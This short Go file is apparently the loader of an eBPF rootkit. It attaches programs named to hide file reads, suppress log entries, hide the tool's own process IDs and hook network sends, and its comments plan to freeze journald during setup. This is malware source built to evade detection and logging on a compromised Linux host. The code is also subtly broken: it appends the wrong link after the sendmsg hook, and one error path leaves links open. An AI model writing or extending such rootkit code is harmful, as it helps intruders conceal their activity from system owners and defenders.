package ebpf

import (
	"github.com/cilium/ebpf/link"
)

func LoadAllEBPF() ([]link.Link, error) {
	var links []link.Link

	// todo:  sig STOP journald
	e, x, err := LoadAndAttachHideRead()
	if err != nil {
		CloseLinks(links...)
		return nil, err
	}
	links = append(links, e, x)
	// todo: sig CONT journald

	exit, err := LoadAndAttachHideLog()
	if err != nil {
		return nil, err
	}
	links = append(links, exit)

	enter, exit, err := HideOwnPIDs()
	if err != nil {
		CloseLinks(links...)
		return nil, err
	}
	links = append(links, enter, exit)

	_, err = LoadAndAttachHookSendMsg()
	if err != nil {
		CloseLinks(links...)
		return nil, err
	}
	links = append(links, enter)

	return links, nil
}
